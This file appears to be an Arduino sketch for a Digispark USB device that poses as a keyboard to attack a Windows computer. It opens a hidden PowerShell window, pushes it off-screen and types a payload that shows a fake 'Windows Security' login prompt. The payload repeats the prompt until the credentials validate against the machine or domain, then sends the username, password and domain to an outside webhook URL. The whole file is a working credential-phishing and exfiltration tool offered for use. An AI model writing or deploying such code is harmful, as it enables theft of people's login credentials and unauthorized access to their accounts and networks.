#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell -noexit -command \"mode con cols=18 lines=1\""); //smallest window possible
  DigiKeyboard.delay(500);
  ////// scrolling code babyy /////
  
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);

  // scrolling code end /////////
  DigiKeyboard.println(F("PowerShell.exe -windowstyle hidden {Start-Sleep -s 60;Add-Type -assemblyname system.DirectoryServices.accountmanagement;$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);$domainDN = \"LDAP://\" + ([ADSI]"").distinguishedName;while($true){$credential = $host.ui.PromptForCredential(\"Windows Security\", \"Enter your credentials\", \"\", \"\");if($credential){$creds = $credential.GetNetworkCredential();[String]$user = $creds.username;[String]$pass = $creds.password;[String]$domain = $creds.domain;$authlocal = $DS.ValidateCredentials($user, $pass);$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass);if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){$script:pastevalue = \"Username: \" + $user + \" Password: \" + $pass + \" Domain:\" + $domain + \" Domain:\"+ $authdomain.name;break}}};Invoke-WebRequest -Uri https://webhook.site/bb75a9ec-dac4-4b87-a1d7-cb3159284bb9 -Method POST -Body $pastevalue}")); //payload
  DigiKeyboard.delay(200);  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
